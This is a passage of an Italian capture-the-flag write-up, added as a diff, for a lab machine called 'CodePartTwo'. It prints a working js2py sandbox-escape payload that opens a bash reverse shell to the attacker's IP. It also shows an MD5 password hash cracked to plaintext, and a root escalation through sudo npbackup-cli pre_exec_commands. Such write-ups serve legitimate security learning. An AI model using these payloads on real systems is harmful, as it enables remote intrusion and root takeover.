@@ -147,3 +147,74 @@ Nell'Erlang shell è presente la funzione os:cmd/1 che esegue comandi di sistema
   (ssh_runner@soulmate)1> os:cmd("cat /root/root.txt").
   "901bcec346798259***************\n"
   (ssh_runner@soulmate)2> 
+
+####################################################################################
+
+#Machine 'CodePartTwo'
+IP: 10.10.11.86
+
+Durante l’analisi, la macchina espone due porte aperte: 22 (SSH) e 8000, su cui gira un servizio Gunicorn 20.0.4 che ospita una webapp.
+Accedendo al sito, è possibile registrarsi e fare login. Dopo l’autenticazione, viene reso disponibile un file App.zip contenente i seguenti elementi: app.py  instance  requirements.txt  static  templates
+
+Dando un’occhiata al codice, si nota che il progetto è basato su Flask e include un database SQLite (inizialmente vuoto), vari file HTML tra cui dashboard.html, e un file requirements.txt con tutte le dipendenze.
+Due file risultano particolarmente interessanti:
+  requirements.txt: contiene la libreria js2py==0.74, che è affetta da vulnerabilità note legate all’esecuzione di codice.
+  dashboard.html: include un editor di codice che permette di scrivere ed eseguire codice direttamente dal browser, mostrando l’output.
+
+Unendo queste due cose: editor con esecuzione diretta + libreria vulnerabile — è stato possibile eseguire codice arbitrario sulla macchina. 
+Con un semplice payload inserito nel code editor e aprendo un listener sulla macchina attaccante (es. con netcat), si ottiene una reverse shell.
+
+payload:
+  let cmd = "/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.87/1234 0>&1'";
+  
+  let hacked, bymarve, n11;
+  let getattr, obj;
+  hacked = Object.getOwnPropertyNames({});
+  bymarve = hacked.__getattribute__;
+  n11 = bymarve("__getattribute__");
+  obj = n11("__class__").__base__;
+  getattr = obj.__getattribute__;
+  
+  function findpopen(o) {
+    let result;
+    for (let i in o.__subclasses__()) {
+      let item = o.__subclasses__()[i];
+      if (item.__module__ == "subprocess" && item.__name__ == "Popen") {
+        // Execute the command using Popen
+        item(cmd, -1, null, -1, -1, -1, null, null, true).communicate();
+      }
+      if (item.__name__ != "type" && (result = findpopen(item))) {
+        return result;
+      }
+    }
+  }
+  
+  n11 = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate();
+  console.log(n11);
+  n11;
+
+Nel progetto è presente un database SQLite (users.db). Aprendolo con sqlite3 users.db si trovano due account:
+
+  app:a97588c0e89e090eef765ef9ef7900ef8
+  marco:649c9d65a206a75f5abe509fe128bce5
+
+Craccando l’hash di marco con CrackStation risulta la password in chiaro:
+
+  649c9d65a206a75f5abe509fe128bce5  (MD5)  ->  sweetangelbabylove
+
+Con queste credenziali è possibile accedere via SSH come marco.
+
+Eseguito sudo -l come utente marco, si scopre che l’utente può eseguire npbackup-cli come root. Questo rappresenta un vettore di 
+attacco significativo: qualsiasi comando eseguito dal binario npbackup-cli viene eseguito con privilegi di root.
+
+Nella home di marco è stato trovato un file di configurazione per npbackup-cli che è stato copiato in /tmp e modificato. 
+Nel file di config c’è una chiave pre_exec_commands che definisce comandi da eseguire prima dell’esecuzione del backup; 
+questi comandi vengono eseguiti con i privilegi di root. Esempio tratto dal file di configurazione:
+
+  pre_exec_commands:
+    - "cp /root/root.txt /tmp/root_flag.txt 2>/dev/null || true"
+    - "chmod 644 /tmp/root_flag.txt 2>/dev/null || true"
+    - "cat /root/root.txt > /tmp/root_direct.txt 2>/dev/null || true"
+
+Quindi, avviando npbackup-cli con i permessi concessi da sudo, i comandi in pre_exec_commands vengono eseguiti come root e possono leggere o copiare file sensibili 
+(es. /root/root.txt) o eseguire qualunque comando con privilegi elevati.
